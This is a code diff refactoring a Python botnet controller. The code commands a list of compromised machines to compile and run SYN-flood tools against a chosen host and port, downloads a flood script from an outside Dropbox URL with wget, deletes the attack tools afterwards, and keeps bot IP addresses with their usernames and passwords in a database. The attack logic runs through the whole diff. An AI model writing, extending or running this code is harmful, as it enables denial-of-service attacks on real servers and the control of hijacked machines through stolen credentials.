@@ -141,25 +141,22 @@ def attackSYN(host,porta):
     for client in botNet:
         print("[*] Starting %sattack%s wait..."%(RED,ENDC))
         print("[!] Attacking %s on port %s!"%(host,porta))
-        output = client.send_command("python flood.py %s %s "%(host,porta))
+        client.send_command("python flood.py %s %s "%(host,porta))
 
 def attackg3m(host,porta):
     for client in botNet:
         print("[*] Starting %sattack%s wait..."%(RED,ENDC))
         print("[!] Attacking %s on port %s!"%(host,porta))
-        output = client.send_command("gcc -o flood g3m.c")
-        output = client.send_command("./flood -h %s -T 3 -p %s,%s "%(host,porta,porta))
+        client.send_command("gcc -o flood g3m.c")
+        client.send_command("./flood -h %s -T 3 -p %s,%s "%(host,porta,porta))
 
 def clear():
     for client in botNet:
         print("[*] clear tool for attack of  %sServer%s"%(RED,ENDC))
         print("[!] Delete all tool installed!")
-        output = client.send_command("rm flood")
-        print output
-        output = client.send_command("rm g3m.c")
-        print output
-        output = client.send_command("rm flood.py")
-        print output
+        client.send_command("rm flood")
+        client.send_command("rm g3m.c")
+        client.send_command("rm flood.py")
  
 def desconnect():
     for client in botNet:
@@ -196,9 +193,7 @@ def inserir_db(ipadress,usuario,senha):
 
 def status_bot():
     cursor = c.execute("SELECT id,ipadress,usuario,senha,datestamp FROM database_bot")
-    teste = 0
     for row in cursor:
-        teste = teste + 1
         print("--------------------------------------------------------------------------------------")
         print("|ID: " + str(row[0]) +"|" + " IPADRESS: " + str(row[1]) +"|"  +  " User: " + str(row[2])+"|"  + " Password: " +str(row[3]) +"|"  + " Data: " + str(row[4]) + "|")
         print("--------------------------------------------------------------------------------------")
@@ -223,7 +218,6 @@ def add_bot2():
         
 def delete_bot(n):
     print("[*] Deleted all BOT in DB!")
-    num = 0
     for num in range(n):
         c.execute("DELETE FROM database_bot WHERE id= %s"%(num))
     conexao.commit()
@@ -276,23 +270,19 @@ def main():
 
         elif search("use delete_all", selecao):
             n = status_bot()
-            n = n + 10
+            n += 10
             delete_bot(n)
             main()
 
         elif search("use attack_start",selecao):
             at = selecao[10:]
             at = map(str, selecao.split())
-            target =  at[2]
-            porta = at[3]
-            attackSYN(target,porta)
+            attackSYN(at[2],at[3])
 
         elif search("use attack_g3m",selecao):
             at = selecao[14:]
             at = map(str, selecao.split())
-            target =  at[2]
-            porta = at[3]
-            attackg3m(target,porta)    
+            attackg3m(at[2],at[3])    
 
         elif search("use install_flood",selecao):
             comando = "wget https://dl.dropboxusercontent.com/u/97321327/flood.py"
